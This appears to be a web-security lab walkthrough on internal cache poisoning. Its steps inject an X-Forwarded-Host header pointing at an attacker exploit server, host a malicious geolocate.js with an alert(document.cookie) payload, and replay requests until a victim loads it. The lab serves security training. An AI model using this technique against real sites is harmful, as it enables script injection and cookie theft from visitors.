# Lab 13 — Internal Cache Poisoning

## Objective

Poison an internal cache so the home page executes `alert(document.cookie)`.

## Step 1 — Establish an oracle

1. Send `GET /` to Repeater.
2. Observe that query-string changes are reflected.
3. Determine that the external cache includes the query string in its key.

## Step 2 — Bypass the external cache

Use Param Miner to add a dynamic cache-buster query parameter.

## Step 3 — Identify the supported header

Use:

```http
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

Observe that the exploit-server URL can appear in multiple dynamic resources.

## Step 4 — Detect internal caching

The source notes that the `geolocate.js` import can remain unchanged while other dynamic URLs are overwritten.

Eventually the geolocate resource can also become poisoned. This indicates that it is cached separately by an internal cache.

The internal cache does not key on the query string.

## Step 5 — Poison the internal resource

Create on the exploit server:

```text
/js/geolocate.js
```

Body:

```javascript
alert(document.cookie)
```

## Step 6 — Final poisoning

1. Disable the dynamic external cache buster.
2. Re-add the X-Forwarded-Host header.
3. Replay repeatedly.
4. Wait until all relevant dynamic URLs point to the exploit server.
5. Keep re-poisoning until the victim visits.

## Key Learning

Different cache layers can have different blind spots. A weakness in an internal cache may be exploitable even when the external cache appears secure.
